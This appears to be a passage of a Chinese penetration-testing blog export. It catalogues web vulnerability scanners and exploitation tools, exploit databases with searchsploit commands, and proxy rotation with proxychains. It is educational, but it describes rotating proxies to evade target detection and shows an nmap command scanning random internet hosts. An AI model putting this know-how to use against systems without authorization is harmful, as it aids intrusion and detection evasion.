<p><img src="/post/_resources/a79d6c745ce01083fc538cd138f8a6c7.png" alt="a79d6c745ce01083fc538cd138f8a6c7.png"></p>
<p>6、把目标url写进targets.txt,一行一个url</p>
<p><img src="/post/_resources/23b7d8b864864a0cdb60c5d38c331d93.png" alt="23b7d8b864864a0cdb60c5d38c331d93.png"></p>
<p>7、用python3运行launcher.py ( XRAY被动扫描为启动的状态 )</p>
<p>8、生成的sub_domains.txt为爬虫爬到的子域名, crawl_result.txt为爬虫爬到的url</p>
<blockquote>
<p>Xray还可以与AWVS、Burpsuite联动，官方文档中有说明，这里就不进行赘述了。</p>
</blockquote>
<h2 id="W13Scan"><a href="#W13Scan" class="headerlink" title="W13Scan"></a>W13Scan</h2><p>W13scan 是基于Python3的一款开源的Web漏洞发现工具,它支持主动扫描模式和被动扫描模式，能运行在Windows、Linux、Mac上。</p>
<p>功能与Xray相似，具有非常丰富的检测插件，而且是开源的。</p>
<p>项目地址：<a href="https://github.com/w-digital-scanner/w13scan">https://github.com/w-digital-scanner/w13scan</a></p>
<p>W13Scan也可以使用被动扫描模式，且也可以与爬虫扫描工具进行联动。</p>
<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>Goby 是一款新的网络安全测试工具，由赵武 Zwell（Pangolin、JSky、FOFA 作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。我们希望能够输出更具生命力的工具，能够对标黑客的实际能力，帮助企业来有效地理解和应对网络攻击。</p>
<p>支持多平台、多国语言。</p>
<p>具有丰富的设备规则集（软硬件设备厂商、系统、业务）、轻量级的协议识别（网络协议、数据库协议、IoT协议、ICS协议）、丰富的端口分组（超过300个常见端口）、最新的漏洞框架（及时更新漏洞信息、民间高手POC）、全面的预置密码检查（设备默认账号密码）</p>
<p>最重要的是免费且扩展性强，联动姿势很多。</p>
<p><img src="https://i.loli.net/2021/10/05/T2OuLpAzSZY7VDX.png" alt="36f5a72c07f3b44be76b25fcc179e99b.png"></p>
<h2 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h2><p>OWASP ZAP，全称：OWASP Zed Attack Proxy攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助我们在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
<p>OWASP ZAP的漏洞扫描能力虽然不是很好用，但它有着非常强大的爬虫功能。</p>
<p>Kali Linux内置工具。</p>
<h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><p>w3af是一种开源web 应用程序安全扫描仪，可帮助开发人员和渗透测试人员识别和利用其 web 应用程序中的漏洞。</p>
<p>w3af能够识别200 多个漏洞，包括跨站点脚本、SQL 注入和操作系统命令。</p>
<p>项目地址：<a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a></p>
<p>相关安装流程可参考：<a href="https://www.jianshu.com/p/171ab006183a">https://www.jianshu.com/p/171ab006183a</a></p>
<h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>Skipfish是一款轻量级的主动的Web应用程序安全侦察工具。它通过执行递归爬取和基于字典的探测来为目标站点准备交互式站点地图。最终的地图然后用来自许多活动（但希望是不中断的）安全检查的输出来注释。该工具生成的最终报告旨在作为专业Web应用程序安全评估的基础。</p>
<p>Kali Linux内置工具。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>单功能漏洞扫描器</title>
    <url>/post/374a33b3.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQL注入漏洞扫描利用工具"><a href="#SQL注入漏洞扫描利用工具" class="headerlink" title="SQL注入漏洞扫描利用工具"></a>SQL注入漏洞扫描利用工具</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>官网地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
<p>这里只是进行一个简单的介绍，之后会对sqlmap进行一个详细讲解。</p>
<h3 id="Pangolin"><a href="#Pangolin" class="headerlink" title="Pangolin"></a>Pangolin</h3><p>Pangolin能够通过一系列非常简单的操作，达到最大化的攻击测试效果。它从检测注入开始到最后控制目标系统都给出了测试步骤。</p>
<h2 id="XSS漏洞扫描利用工具"><a href="#XSS漏洞扫描利用工具" class="headerlink" title="XSS漏洞扫描利用工具"></a>XSS漏洞扫描利用工具</h2><h3 id="XSSer"><a href="#XSSer" class="headerlink" title="XSSer"></a>XSSer</h3><p>XSSer (Cross site “scripter”)是一款自动化渗透测试XSS漏洞的安全工具,专门用来检测和利用不同应用程序中存在的跨站脚本漏洞。它包含了一些选项用来尝试绕过特定的过滤器，并且具有特殊的代码注入技术。</p>
<h3 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h3><p>XSStrike 是一个跨站点脚本攻击检测套件，包含四个手写的解析器，一个智能有效的 payload 生成器，一个强大的模糊搜索引擎和一个非常快速的爬虫。</p>
<p>项目地址：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
<h3 id="Xspear"><a href="#Xspear" class="headerlink" title="Xspear"></a>Xspear</h3><p>一款基于 RubyGems 的 XSS 漏洞扫描器。能够进行常见的 XSS 扫描测试以及参数分析。</p>
<p>项目地址：<a href="https://github.com/hahwul/XSpear">https://github.com/hahwul/XSpear</a></p>
<h3 id="ezXSS"><a href="#ezXSS" class="headerlink" title="ezXSS"></a>ezXSS</h3><p>ezXSS是一款用于渗透测试和漏洞挖掘的XSS盲测跨站脚本工具。</p>
<p>项目地址：<a href="https://github.com/ssl/ezXSS">https://github.com/ssl/ezXSS</a></p>
<h3 id="OWASP-Xenotix-XSS"><a href="#OWASP-Xenotix-XSS" class="headerlink" title="OWASP Xenotix XSS"></a>OWASP Xenotix XSS</h3><p>Xenotix XSS Exploit Framework是一款用于检测和利用WEB应用程序中的XSS漏洞的渗透测试工具。这个工具可以将代码注入到含有xss漏洞的web页面中。</p>
<h2 id="CSRF漏洞扫描利用工具"><a href="#CSRF漏洞扫描利用工具" class="headerlink" title="CSRF漏洞扫描利用工具"></a>CSRF漏洞扫描利用工具</h2><h3 id="CSRF-Tester"><a href="#CSRF-Tester" class="headerlink" title="CSRF Tester"></a>CSRF Tester</h3><p>CSRFTester是一个用于测试网站中CSRF（跨站点请求伪造）漏洞的开源工具。</p>
<h3 id="CSRF-Request-Builder"><a href="#CSRF-Request-Builder" class="headerlink" title="CSRF Request Builder"></a>CSRF Request Builder</h3><p>CSRF Request Builder是一款CSRF漏洞利用和测试工具。</p>
<p>项目地址：<a href="https://github.com/PanYX/CSRF-Request-Builder">https://github.com/PanYX/CSRF-Request-Builder</a></p>
<h2 id="SSRF漏洞扫描利用工具"><a href="#SSRF漏洞扫描利用工具" class="headerlink" title="SSRF漏洞扫描利用工具"></a>SSRF漏洞扫描利用工具</h2><h3 id="Extended-ssrf-search"><a href="#Extended-ssrf-search" class="headerlink" title="Extended ssrf search"></a>Extended ssrf search</h3><p>Extended ssrf search是一款功能强大的SSRF智能漏洞扫描工具，该工具可以通过在请求中设置不同的预定义参数来搜索SSRF漏洞，这些参数包括路径、主机、Header、POST和GET参数。</p>
<p>项目地址：<a href="https://github.com/Damian89/extended-ssrf-search">https://github.com/Damian89/extended-ssrf-search</a></p>
<h3 id="See-SURF"><a href="#See-SURF" class="headerlink" title="See-SURF"></a>See-SURF</h3><p>See-SURF是一款基于Python开发的扫描工具，它可以帮助安全研究人员查找并发现目标Web应用程序中潜在的SSRF参数。</p>
<p>项目地址：<a href="https://github.com/In3tinct/See-SURF">https://github.com/In3tinct/See-SURF</a></p>
<h2 id="XXE漏洞扫描利用工具"><a href="#XXE漏洞扫描利用工具" class="headerlink" title="XXE漏洞扫描利用工具"></a>XXE漏洞扫描利用工具</h2><h3 id="XXExploiter"><a href="#XXExploiter" class="headerlink" title="XXExploiter"></a>XXExploiter</h3><p>XXExploiter是一款功能强大的XXE漏洞扫描与利用工具，在它的帮助下，广大安全研究人员可以轻松发现和利用XXE漏洞。</p>
<p>项目地址：<a href="https://github.com/luisfontes19/xxexploiter">https://github.com/luisfontes19/xxexploiter</a></p>
<h3 id="xxer"><a href="#xxer" class="headerlink" title="xxer"></a>xxer</h3><p>XXE盲注回调处理程序。使用HTTP和FTP提取信息。</p>
<p>项目地址：<a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a></p>
<h2 id="CMS通用漏洞扫描利用工具"><a href="#CMS通用漏洞扫描利用工具" class="headerlink" title="CMS通用漏洞扫描利用工具"></a>CMS通用漏洞扫描利用工具</h2><h3 id="CMSmap"><a href="#CMSmap" class="headerlink" title="CMSmap"></a>CMSmap</h3><p>CMSmap是一个Python编写的针对开源CMS（内容管理系统）的安全扫描器，它可以自动检测当前国外最流行的CMS的安全漏洞。 CMSmap主要是在一个单一的工具集合了不同类型的CMS的常见的漏洞。CMSmap目前只支持WordPress，Joomla和Drupal。</p>
<p>项目地址：<a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></p>
<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h3><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
<h3 id="JoomScan"><a href="#JoomScan" class="headerlink" title="JoomScan"></a>JoomScan</h3><p>OWASP Joomla！漏洞扫描程序（JoomScan）是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。此外，OWASP JoomScan提供了用户友好的界面，并以文本和HTML格式编译最终报告，以便于使用和最小化报告开销。 OWASP JoomScan包含在Kali Linux发行版中。</p>
<h3 id="DeDeScan"><a href="#DeDeScan" class="headerlink" title="DeDeScan"></a>DeDeScan</h3><p>dedescan是一款可以扫描所有已公开的dedecms漏洞的扫描器。</p>
<p>项目地址：<a href="https://github.com/lengjibo/dedecmscan">https://github.com/lengjibo/dedecmscan</a></p>
<h3 id="DzScan"><a href="#DzScan" class="headerlink" title="DzScan"></a>DzScan</h3><p>DzScan是一款Python编写的针对大部分Discuz CMS漏洞的扫描工具。</p>
<p>项目地址：<a href="https://github.com/melodyzx/dzscan">https://github.com/melodyzx/dzscan</a></p>
<h2 id="Web框架漏洞扫描利用工具"><a href="#Web框架漏洞扫描利用工具" class="headerlink" title="Web框架漏洞扫描利用工具"></a>Web框架漏洞扫描利用工具</h2><h3 id="Struts2-Scan"><a href="#Struts2-Scan" class="headerlink" title="Struts2-Scan"></a>Struts2-Scan</h3><p>Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057</p>
<p>项目地址：<a href="https://gitee.com/sq_smile/Struts2-Scan">https://gitee.com/sq_smile/Struts2-Scan</a></p>
<h3 id="s2sniper"><a href="#s2sniper" class="headerlink" title="s2sniper"></a>s2sniper</h3><p>这是一款针对struts2的漏洞检测工具，目前支持检测045，046，048，并且可以继续添加，可批量，可自定义线程数。</p>
<p>项目地址：<a href="https://github.com/theLSA/s2sniper">https://github.com/theLSA/s2sniper</a></p>
<h3 id="K8-Struts2-Exp"><a href="#K8-Struts2-Exp" class="headerlink" title="K8 Struts2 Exp"></a>K8 Struts2 Exp</h3><p>一款Struts2综合漏洞利用工具，可以对Struts2框架漏洞进行扫描与利用。</p>
<h3 id="Struts2漏洞检查工具"><a href="#Struts2漏洞检查工具" class="headerlink" title="Struts2漏洞检查工具"></a>Struts2漏洞检查工具</h3><p>一款安恒大佬编写的Struts2全版本漏洞检测与利用工具。</p>
<h3 id="TPscan"><a href="#TPscan" class="headerlink" title="TPscan"></a>TPscan</h3><p>一个thinkphp的漏洞集成检测工具,TPScan目前能检测的Thinkphp漏洞列表[18个],包含TP3、TP5已知漏洞。</p>
<p>项目地址：<a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a></p>
<h2 id="Web中间件扫描利用工具"><a href="#Web中间件扫描利用工具" class="headerlink" title="Web中间件扫描利用工具"></a>Web中间件扫描利用工具</h2><h3 id="Vulmap"><a href="#Vulmap" class="headerlink" title="Vulmap"></a>Vulmap</h3><p>Vulmap 是一款 web 漏洞扫描和验证工具, 可对 webapps 进行漏洞扫描, 并且具备漏洞利用功能, 目前支持的 webapps 包括 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, fastjson, jenkins, nexus, weblogic, jboss, spring, thinkphp</p>
<p>Vulmap 将漏洞扫描与验证（漏洞利用）结合到了一起, 及大程度便于测试人员在发现漏洞后及时进行下一步操作, 工具追求于于高效、便捷 高效: 逐步开发中慢慢引入了批量扫描、Fofa、Shodan 批量扫描, 且支持多线程默认开启协程, 以最快的速度扫描大量资产 便捷: 发现漏洞即可利用, 大量资产扫描可多格式输出结果</p>
<p>项目地址：<a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></p>
<h3 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h3><p>Nuclei可以基于模板来跨目标发送请求，能够实现零误报，并且可以帮助研究人员对已知路径执行有效的扫描。Nuclei的主要使用场景为网络侦察的初始阶段，可以帮助研究人员快速检查已知且易于探测的目标中是否存在安全漏洞。该工具使用了来处理各种错误，并在Web应用防火墙屏蔽的情况下进行自动重传，这也是该工具的核心模块之一。</p>
<p>项目地址（本体）：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
<p>项目地址（模板）：<a href="https://github.com/projectdiscovery/nuclei-templates">https://github.com/projectdiscovery/nuclei-templates</a></p>
<h3 id="weblogic-scan"><a href="#weblogic-scan" class="headerlink" title="weblogic-scan"></a>weblogic-scan</h3><p>weblogic 漏洞扫描工具。</p>
<p>目前检测的功能：</p>
<ul>
<li>console 页面探测 &amp; 弱口令扫描</li>
<li>uuid页面的SSRF</li>
<li>CVE-2017-10271 wls-wsat页面的反序列化</li>
<li>CVE-2018-2628 反序列化</li>
<li>CNVD-C-2019-48814</li>
</ul>
<p>项目地址：<a href="https://github.com/kingkaki/weblogic-scan">https://github.com/kingkaki/weblogic-scan</a></p>
<h3 id="JexBoss"><a href="#JexBoss" class="headerlink" title="JexBoss"></a>JexBoss</h3><p>Jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。</p>
<p>项目地址：<a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p>
<h3 id="shiro-attack"><a href="#shiro-attack" class="headerlink" title="shiro attack"></a>shiro attack</h3><p>基于javafx,利用shiro反序列化漏洞进行回显命令执行以及注入各类内存马。</p>
<p>项目地址：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
<h3 id="DockerXScan"><a href="#DockerXScan" class="headerlink" title="DockerXScan"></a>DockerXScan</h3><p>Docker镜像漏洞扫描器，对docker镜像逐层分析，并提取其版本特征。 通过匹配特征，来比对CVE漏洞。</p>
<p>项目地址：<a href="https://github.com/antime/DockerXScan">https://github.com/antime/DockerXScan</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全漏洞库</title>
    <url>/post/dc330496.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Exploit-DB"><a href="#Exploit-DB" class="headerlink" title="Exploit-DB"></a>Exploit-DB</h2><p>ExploitDB 是一个面向全世界黑客的漏洞提交平台，该平台会公布最新漏洞的相关情况，这些可以帮助企业改善公司的安全状况，同时也以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Exploit-DB提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。</p>
<h3 id="在线查找漏洞"><a href="#在线查找漏洞" class="headerlink" title="在线查找漏洞"></a>在线查找漏洞</h3><p>到<a href="https://www.exploit-db.com/">https://www.exploit-db.com</a>上搜索即可。</p>
<p><img src="https://i.loli.net/2021/10/14/va62dhtME1wq9zI.png" alt="image-20211014172310542"></p>
<h3 id="离线查找漏洞"><a href="#离线查找漏洞" class="headerlink" title="离线查找漏洞"></a>离线查找漏洞</h3><p>使用searchsploit命令行工具。</p>
<p><strong>1、更新数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -u</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/14/PmsB5J1KepGg7R6.png" alt="image-20211014171737427"></p>
<p><strong>2、查看帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -h</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/14/G1UYa6AlB3qKZCd.png" alt="image-20211014180731979"></p>
<p><strong>3、查找漏洞</strong></p>
<p>默认情况下 以and 进行筛选，筛选出Metasploit的脚本。</p>
<p>然后把脚本放入msf对应的目录/usr/share/metasploit-framework/modules/**/之下，之后在msfconle下执行reload_all即可使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit exploits linux remote Metasploit Samba</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/14/Lxgt9isKMqJzDuv.png" alt="image-20211014172828657"></p>
<p><strong>4、查看具体ID的功能 利用方式代码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 42084 --examine</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/14/25UdGrQ7gzSp8JL.png" alt="image-20211014180804336"></p>
<p><strong>5、 拷贝路径，或文件</strong></p>
<p>拷贝路径： <code>searchsploit -p EDB-ID</code></p>
<p>拷贝代码文件到当前目录：<code>searchsploit -m EDB-ID</code></p>
<p><img src="https://i.loli.net/2021/10/14/HcWGUn5deMqOlKs.png" alt="image-20211014173113069"></p>
<p><strong>6、显示在线url，排除关键字</strong></p>
<p><img src="https://i.loli.net/2021/10/14/Afnj6tIJBavu59G.png" alt="image-20211014181014634"></p>
<h2 id="常用漏洞公布网站"><a href="#常用漏洞公布网站" class="headerlink" title="常用漏洞公布网站"></a>常用漏洞公布网站</h2><p>国家信息安全漏洞库（CNNVD）：<a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
<p>国家信息安全漏洞共享平台（CNVD）：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
<p>通用漏洞披露平台（CVE）：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p>
<p>通用缺陷枚举平台（CWE）：<a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a></p>
<p>美国国家漏洞库：<a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></p>
<p>信息安全漏洞门户：<a href="http://vulhub.org.cn/">http://vulhub.org.cn/</a></p>
<p>知道创宇-Seebug：<a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
<p>绿盟科技漏洞发布：<a href="http://www.nsfocus.net/index.php?act=sec_bug">http://www.nsfocus.net/index.php?act=sec_bug</a></p>
<h2 id="PeiQi-WiKi"><a href="#PeiQi-WiKi" class="headerlink" title="PeiQi WiKi"></a>PeiQi WiKi</h2><p>PeiQi大佬整理的漏洞POC与红队工具文库，原来是有线上地址的，不过受9月新规（数据安全法）的影响，关闭了网站。项目仓库还是有的，大家可以自行搭建。</p>
<p>PeiQi WiKi-POC文库：<a href="https://github.com/PeiQi0/PeiQi-WIKI-POC">https://github.com/PeiQi0/PeiQi-WIKI-POC</a></p>
<p>PeiQi WiKi-RED文库：<a href="https://github.com/PeiQi0/PeiQi-WIKI-RED">https://github.com/PeiQi0/PeiQi-WIKI-RED</a></p>
<h2 id="乌云镜像站"><a href="#乌云镜像站" class="headerlink" title="乌云镜像站"></a>乌云镜像站</h2><p>乌云网（WooYun）漏洞平台是一个位于厂商和安全研究者之间的安全问题反馈平台，在对安全问题进行反馈处理跟进的同时，为互联网安全研究者提供一个公益、学习、交流和研究的平台。其名字来源于目前互联网上的“云”，在这个不做“云”不好意思和人家打招呼的时代，网络安全相关的，无论是技术还是思路都会有点黑色的感觉，所以自然出现了乌云。2016年7月20日，乌云网因官方正在进行升级，至今无法访问。</p>
<p>github地址：<a href="https://github.com/hanc00l/wooyun_public">https://github.com/hanc00l/wooyun_public</a></p>
<p>在线镜像地址：<a href="http://wy.zone.ci/">http://wy.zone.ci/</a></p>
<h2 id="GitHub常见漏洞PoC与EXP"><a href="#GitHub常见漏洞PoC与EXP" class="headerlink" title="GitHub常见漏洞PoC与EXP"></a>GitHub常见漏洞PoC与EXP</h2><p>Middleware-Vulnerability-detection：<a href="https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection">https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection</a></p>
<p>Penetration_Testing_POC：<a href="https://github.com/Mr-xn/Penetration_Testing_POC">https://github.com/Mr-xn/Penetration_Testing_POC</a></p>
<p>super-guacamole：<a href="https://github.com/xiazibet/super-guacamole">https://github.com/xiazibet/super-guacamole</a></p>
<p>CMS-Hunter：<a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>代理与代理池</title>
    <url>/post/5b1bcb5a.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="代理的介绍"><a href="#代理的介绍" class="headerlink" title="代理的介绍"></a>代理的介绍</h2><h3 id="代理是什么？"><a href="#代理是什么？" class="headerlink" title="代理是什么？"></a>代理是什么？</h3><p>代理IP又称代理服务器(Proxy Server)，形象的讲，代理服务器是网络信息的中转站，它是介于浏览器和Web服务器之间的一台服务器，有了它之后，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。</p>
<h3 id="代理有什么用？"><a href="#代理有什么用？" class="headerlink" title="代理有什么用？"></a>代理有什么用？</h3><p>使用爬虫爬取网站或者使用扫描器扫描目标时经常会遇到扫描频率较为频繁导致IP被封或者限制访问的情况，这时候我们就需要考虑利用IP代理的方式不断的变换IP进行爬虫和扫描，从而逃避目标端的检测。</p>
<h3 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h3><p>代理池管理大量代理。换句话说，它是一个控制代理质量的系统，并决定哪些IP将被包含在某人使用的一组代理中。</p>
<p>如果您花费大量时间完成上述任务（例如SEO，数据挖掘），则使用代理池非常有用。通常情况下，从单一住宅IP发出所有请求是不安全的，因为您可以快速被禁止。</p>
<p>因此，您需要拥有一组始终保持IP隐藏的代理。此外，它们将足够快地旋转，以便目标网站服务器没有足够的时间将其中任何一个识别为可疑。</p>
<p>但是，在开始执行任务之前，需要准备好代理池。这使您可以专注于您正在做的事情而不是担心如果您将被服务器禁止。</p>
<h3 id="如何获取代理IP"><a href="#如何获取代理IP" class="headerlink" title="如何获取代理IP"></a>如何获取代理IP</h3><p>免费代理的网站问一下度娘或者谷哥应该就能得到很多答案，有：快代理 ()[<a href="https://www.kuaidaili.com/free/">https://www.kuaidaili.com/free/</a>) 、[ProxyList（<a href="https://proxy-list.org/english/index.php">https://proxy-list.org/english/index.php</a>) ，PorxyList是国外的一个提供免费代理的网站，貌似需要翻墙访问，这里我使用快代理提供的IP和端口。</p>
<p><img src="https://i.loli.net/2021/10/05/Z4BceUm6oHlxjGs.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/N5scE2XdCJIo4gU.jpg" alt="img"></p>
<p>需要注意的是，在使用proxychains代理转发过程中，如果目标对象为https，那么需要使用支持SSL/https协议的代理，快代理提供的免费代理均只支持http协议；Proxy List中有支持SSL/HTTPS协议且免费的代理。</p>
<p>不过还是建议购买付费代理池。</p>
<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p>
<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>在以下几种场合，你可以考虑使用ProxyChains：需要通过代理上网，或者需要突破诸如设置了端口限制的防火墙；或者要使用telnet，ssh，wget，vnc，apt，ftp，nmap等应用；事实上，甚至可以通过ProxyChains设置反向代理来让你能够从外部访问你的内部局域网。突破防火墙限制访问互联网。</p>
<h3 id="特色功能"><a href="#特色功能" class="headerlink" title="特色功能"></a>特色功能</h3><p>①支持不同的代理选择策略： 随机（代理列表内），顺序，动态顺序 (智能排除无用的代理)</p>
<p>②可以与任意程序结合使用，甚至网络扫描。通过代理或代理链可以实现端口扫描。</p>
<p>③通过可调的超时设定，支持真正的长代理链。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Kali中自带ProxyChains，也可以从<a href="https://github.com/rofl0r/proxychains-ng下载安装。ProxyChains运行的所有配置都在/etc/proxychains.conf中。">https://github.com/rofl0r/proxychains-ng下载安装。ProxyChains运行的所有配置都在/etc/proxychains.conf中。</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install proxychains4</span><br></pre></td></tr></table></figure>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>修改配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
<ul>
<li><p>dynamic_chain：该配置项能够通过ProxyList中的每个代理运行流量，如果其中一个代理关闭或者没有响应，它能够自动选择ProxyList中的下一个代理。</p>
</li>
<li><p>strict_chain：改配置为ProxyChains的默认配置，不同于dynamic_chain，也能够通过ProxyList中的每个代理运行流量，但是如果ProxyList中的代理出现故障，不会自动切换到下一个。</p>
</li>
<li><p>random_chain：该配置项会从ProxyList中随机选择代理IP来运行流量，如果ProxyList中有多个代理IP，在使用proxychains的时候会使用不同的代理访问目标主机，从而使主机端探测流量更加困难。</p>
</li>
</ul>
<p>例如：现在需要添加一个Socks5代理</p>
<p>将 dynamic_chain 前面的 “#” 去掉，并在 strict_chain 前添加 “#” 。</p>
<p><img src="https://i.loli.net/2021/10/05/RIaXKnkBHUxG7QL.png" alt="配置1"></p>
<p>来到文件尾部，注释掉 sock4 开头的一行配置信息，因为我们需要所有流量均走 socks5 ，在其下方添加一行配置信息，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks5 &lt;主机IP&gt; &lt;转发端口&gt;</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 &lt;运行的命令&gt; &lt;命令参数&gt;</span><br></pre></td></tr></table></figure>
<p>例如：使用Nmap scanner通过代理可以查找web服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -PO -p 80 -iR</span><br></pre></td></tr></table></figure>
<p>-q参数可以静默适用代理，不会出现proxychains连接提示。</p>
<h2 id="Proxy-Pool"><a href="#Proxy-Pool" class="headerlink" title="Proxy_Pool"></a>Proxy_Pool</h2><p>Proxy_Pool，一个小巧的代理ip抓取+评估+存储+展示的一体化的工具，可自动化的搜集检测可用代理并进行评分，并添加了web展示和接口。</p>
<p>程序的几个功能：</p>
<p>1、每天从多个代理ip网站上抓下最新高匿ip数据。</p>
<p>2、经过筛选后的ip将存入数据库。</p>
